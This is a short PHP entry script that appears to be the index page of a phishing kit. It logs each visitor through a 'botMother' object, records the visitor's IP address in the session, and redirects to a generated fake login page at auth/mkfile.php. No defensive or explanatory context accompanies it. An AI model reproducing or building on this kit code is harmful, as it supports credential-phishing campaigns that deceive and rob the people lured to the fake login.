<?php
require 'main.php';
@$botMother->saveHit();
$_SESSION['passport'] = $_SERVER['REMOTE_ADDR'];
header("location: auth/mkfile.php?p=login");
?>